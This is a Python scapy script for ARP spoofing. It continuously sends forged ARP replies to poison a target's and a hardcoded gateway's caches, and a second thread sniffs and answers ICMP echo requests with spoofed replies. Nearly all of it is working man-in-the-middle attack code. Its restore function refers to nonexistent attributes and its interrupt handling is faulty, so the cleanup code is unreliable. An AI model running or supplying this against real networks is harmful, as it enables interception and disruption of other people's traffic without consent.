#!/usr/bin/env python3

from scapy.layers.inet import IP
import scapy.all as scapy
import os
import sys                  #sys.argv
import time
import threading


"""------------------returns the MAC address of a device given its IP address"""
def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, 
                                timeout = 5, 
                                verbose = False)[0]
    return answered_list[0][1].hwsrc


"""---------------------------sends a spoofed ARP packet to the target device"""
def spoof(target_ip, spoof_ip):
    packet = scapy.Ether(dst=get_mac(target_ip)) / scapy.ARP(op = 2, 
                            pdst = target_ip, 
                            hwdst = get_mac(target_ip),
                            psrc = spoof_ip)
    scapy.sendp(packet, verbose = False)
    time.sleep(1)
	
 
"""sends continuously sends spoofed ARP packets to the target and the gateway"""
def arp_spoof():
    sent_packets_count = 0
    while True:                                         
        spoof(target_ip, gateway_ip)                    
        spoof(gateway_ip, target_ip)                    
        sent_packets_count = sent_packets_count + 2    
        print("\r[*] Packets Sent "+str(sent_packets_count), end="")


"""--------------------------------------sends an ICMP response to the source"""
def send_icmp_response(packet):  # Create the ICMP response packet
    resp = scapy.IP(dst=packet[IP].src, 
                    src=packet[IP].dst)/scapy.ICMP(type='echo-reply', 
                    id=packet[scapy.ICMP].id, 
                    seq=packet[scapy.ICMP].seq)/packet[scapy.ICMP].payload
    scapy.send(resp , verbose = False)       


def sniff_icmp(packet):
	if scapy.ICMP in packet and packet[scapy.ICMP].type == 8:
		send_icmp_response(packet)


def packet_sniffer():
	scapy.sniff(filter = "icmp", prn = sniff_icmp)


def restore(target_ip, attacker_ip):
	destination_mac = get_mac(scapy.destination_ip)
	source_mac = get_mac(scapy.source_ip)
	packet = scapy.ARP(op = 2, pdst = scapy.destination_ip,
                       hwdst = destination_mac, 
                       psrc = scapy.source_ip,
                       hwsrc = source_mac)
	scapy.send(packet, verbose = False)



if len(sys.argv) < 2:
    print("Usage: ./arp_spoofing.py [target_ip]")
    sys.exit()   
target_ip = sys.argv[1]
gateway_ip = "192.168.0.50"
target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway_ip)
attacker_ip = "192.168.0.125"
print("gateway\t", gateway_mac,"|", gateway_ip)
print("target\t", target_mac,"|", target_ip)


"""----------------------------------------------------------------------main"""
def main():

	try:
		thread1 = threading.Thread(target=arp_spoof)
		thread2 = threading.Thread(target=packet_sniffer)
		thread1.start()
		thread2.start()
		time.sleep(2)
	except KeyboardInterrupt:
		print("\nCtrl + C pressed.............Exiting")
		restore(gateway_ip, target_ip)
		restore(target_ip, gateway_ip)
		print("[+] Arp Spoof Stopped")
		
if __name__ == "__main__":
	main()


